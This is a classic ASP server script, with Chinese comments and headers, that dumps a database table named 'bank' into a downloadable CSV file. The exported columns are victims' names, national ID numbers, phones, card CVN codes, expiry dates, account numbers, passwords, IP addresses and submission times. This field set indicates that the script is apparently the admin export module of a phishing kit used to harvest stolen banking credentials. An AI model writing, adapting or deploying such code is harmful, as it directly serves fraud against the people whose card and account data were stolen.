<!--#include file="lconn.asp"-->
<% 
dim referer 
referer = Request.ServerVariables("HTTP_REFERER") 
Dim CName,action 
action=request.Form("action") 
CName="./Excel/" 
dim daytime 
daytime=year(now())&"-"&month(now())&"-"&day(now())&"-"&hour(now())&"-"&Minute(now()) 
'daytime=year(now())&"年"&month(now())&"月"&day(now())&"日"&hour(now())&"时" 
Set rs = Server.CreateObject("ADODB.Recordset") 
'--从数据库中把你想放到EXCEL中的数据查出来 
sql="select * from bank order by id desc" 
rs.Open sql,conn 
if rs.EOF and rs.BOF then 
   response.write "<script>alert(’操作出错，下面是产生错误的可能原因：\n\n库里暂时没有数据，所以不能导出EXCEL文件!’);location.href = ’"&referer&"’;</script>" 
  response.end 
else 
    Dim Fs,Exc 
    Dim Excelstring,ExcelHead,Excelstr,Excelstr2 
    Dim Scou_FileNamen,Scou_FieldList 
    Dim Dest_FileName,Dest_FieldList 
     
    Dest_FileName=""&CName&""&daytime&".csv" 
    Excelstring = "" 
    ExcelHead = "序号" & "," & "开户行" & "," & "姓名"& "," & "身份证"& "," & "手机"& "," & "CVN"& "," & "有效期" & "," & "账号" & "," & "密码"& "," & "IP地址"& "," & "提交时间" 
    Set Rs = Server.CreateObject ("ADODB.Recordset") 
    Sql = "Select * From bank" 
    Rs.Open Sql,Conn,1,3 
    Do While Not Rs.Eof  
        Excelstr = Rs("ID") & "," & Rs("khh") & "," & Rs("xm") & "," & "'" & Rs("sfz") & "," & Rs("dh") & "," & Rs("cvn")& "," & Rs("yxq") & "," & "'" & Rs("zh") & "," & Rs("mm") & "," & Rs("ip")& "," & Rs("sj") 
        Excelstr2 = Excelstr2 & Chr(13) & Excelstr  
        Rs.Movenext 
    Loop 
    Excelstring = ExcelHead & Excelstr2 
    Rs.Close 
    Set Rs=Nothing 
     
     
    Set Fs = CreateObject("Scripting.FileSystemObject") 
    Set Exc = Fs.OpenTextFile(Server.MapPath(Dest_FileName),2,True) 
    Exc.Write(Excelstring) 
    If Fs.FileExists(Server.MapPath(Dest_FileName)) Then 
        Response.Write("<a href="&Dest_FileName&">报表已经生成，点击查看</a><hr>") 
        Response.Write("<a href="&referer&">返回</a>") 
        'Response.write(Excelstring) 
    Else  
        Response.Write("生成报表失败！") 
    End If 
end if 
%>